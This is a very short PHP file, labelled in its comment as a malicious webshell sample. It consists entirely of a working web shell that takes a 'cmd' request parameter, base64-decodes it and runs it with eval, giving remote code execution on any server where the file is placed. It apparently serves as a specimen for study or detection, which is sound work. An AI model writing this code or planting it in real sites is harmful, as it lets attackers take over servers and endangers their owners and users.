<?php
// Malicious webshell sample
$payload = $_REQUEST['cmd'];
if ($payload) {
    eval(base64_decode($payload));
}
